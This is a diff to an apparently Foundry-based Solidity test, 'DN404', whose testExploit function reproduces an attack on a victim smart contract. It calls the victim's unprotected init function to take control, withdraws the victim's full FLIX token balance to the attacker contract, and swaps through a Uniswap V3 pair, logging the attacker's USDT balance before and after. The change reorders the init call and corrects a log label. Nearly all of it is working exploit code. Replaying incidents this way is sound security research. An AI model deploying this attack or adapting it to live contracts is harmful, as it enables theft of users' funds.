@@ -52,14 +52,16 @@ contract DN404 is Test {
     function testExploit() public {
         // Implement exploit code here
         emit log_named_decimal_uint(" Attacker USDT Balance Before exploit", IERC20(USDT).balanceOf(address(this)), 6);
+        
         uint256 initPeriods = 1;
         uint256 initInterval = 1_000_000_000_000_000_000;
-        IProxy(victim).init(IERC20(WETH), initPeriods, initInterval);
         uint256 amount = IERC20(FLIX).balanceOf(address(victim));
+
+        IProxy(victim).init(IERC20(WETH), initPeriods, initInterval);
         IProxy(victim).withdraw(IERC20(FLIX), amount, address(this));
         Uni_Pair_V3(UniV3Pair).swap(address(this), true, 685_000_000_000_000_000_000_000, 4_295_128_740, "");
         // Log balances after exploit
-        emit log_named_decimal_uint(" Attacker USDT Balance Before exploit", IERC20(USDT).balanceOf(address(this)), 6);
+        emit log_named_decimal_uint(" Attacker USDT Balance After exploit", IERC20(USDT).balanceOf(address(this)), 6);
     }
 
       function uniswapV3SwapCallback(
